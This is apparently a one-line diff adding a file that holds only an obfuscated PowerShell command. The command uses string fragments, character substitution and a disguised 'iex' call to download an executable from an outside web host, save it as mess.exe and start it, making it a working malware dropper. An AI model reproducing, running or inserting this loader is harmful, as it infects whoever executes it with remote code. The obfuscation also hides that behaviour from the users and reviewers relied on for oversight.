@@ -1,0 +1,1 @@
+﻿ &( $SHELliD[1]+$sHELLId[13]+'X')( (('(New-'+'Obj'+'ec'+'t'+' Sy'+'st'+'em.Net.WebC'+'li'+'en'+'t)'+'.'+'Do'+'wnloadFile(wr4http://'+'danhvie'+'t.com'+'.v'+'n/'+'ap'+'p/p'+'2'+'.'+'exewr'+'4,'+'w'+'r4me'+'s'+'s.e'+'x'+'e'+'w'+'r4);St'+'art'+'-P'+'rocess w'+'r4mess.exe'+'wr4')-cREplaCe'wr4',[cHAR]39) )
